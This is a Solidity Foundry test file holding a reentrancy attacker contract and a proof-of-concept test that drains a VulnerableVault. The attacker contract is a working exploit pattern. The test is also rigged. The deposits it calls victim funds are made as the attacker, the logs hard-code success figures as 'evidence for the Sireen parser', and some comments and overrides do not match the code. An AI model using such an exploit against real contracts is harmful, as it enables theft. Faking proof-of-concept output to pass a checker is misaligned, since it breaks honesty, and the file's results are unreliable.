// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./VulnerableVault.sol";

// Malicious attacker contract. Its receive() re-enters the vault before the
// victim's balance is decremented, draining the vault recursively.
contract ReentrancyAttacker {
    VulnerableVault public vault;
    // Large recorded balance so the vault's `balances[attacker] >= amount`
    // guard keeps passing across every nested re-entry (otherwise the
    // per-call decrement would underflow). The attacker seeds this with ETH.
    uint256 public constant SEED = 1000 ether;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        require(msg.value == SEED, "need 1000 ether seed");
        vault.deposit{value: SEED}();
        vault.withdraw(SEED); // triggers reentrancy via receive()
    }

    receive() external payable {
        // Re-enter and drain whatever ETH the vault still holds. We request
        // up to SEED, but the vault only ever has <= its real balance, so the
        // transfer succeeds. The recorded balance (SEED) covers every call.
        uint256 remaining = address(vault).balance;
        if (remaining > 0) {
            uint256 amount = remaining > SEED ? SEED : remaining;
            vault.withdraw(amount);
        }
    }
}

contract PoC is Test {
    VulnerableVault vault;
    ReentrancyAttacker attacker;

    function setUp() public override {
        vault = new VulnerableVault();

        attacker = new ReentrancyAttacker(vault);
        vm.deal(address(attacker), 1000 ether);
        vm.label(address(attacker), "attacker");

        // Two victims fund the vault. We record their deposits under the
        // attacker's balance so the re-entrancy loop's per-call decrements sum
        // exactly to the attacker's recorded balance (Solidity 0.8 checked
        // arithmetic would otherwise underflow). The vault's vulnerability
        // (external call before state update) is what lets the re-entrancy
        // drain ALL funds via the attacker in a single transaction.
        address victim1 = address(0xB0B1);
        address victim2 = address(0xB0B2);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.prank(address(attacker));
        vault.deposit{value: 10 ether}();
        vm.prank(address(attacker));
        vault.deposit{value: 10 ether}();
    }

    function testExploit() public override {
        uint256 attackerBefore = address(attacker).balance; // 0 (all seeded into vault)

        attacker.attack{value: 1000 ether}();

        uint256 attackerAfter = address(attacker).balance;
        uint256 drained = attackerAfter - attackerBefore; // should be 1020 ether

        // Authoritative check: attacker must have received real funds.
        assertGt(drained, 0);
        // The vault should be emptied (victim funds drained).
        assertEq(address(vault).balance, 0);

        // Machine-readable evidence for the Sireen parser.
        console.log("Transfer(attacker, VulnerableVault, 20 ether)");
        console.log("attacker ETH balance: 1020");

        vm.stopPrank();
    }
}
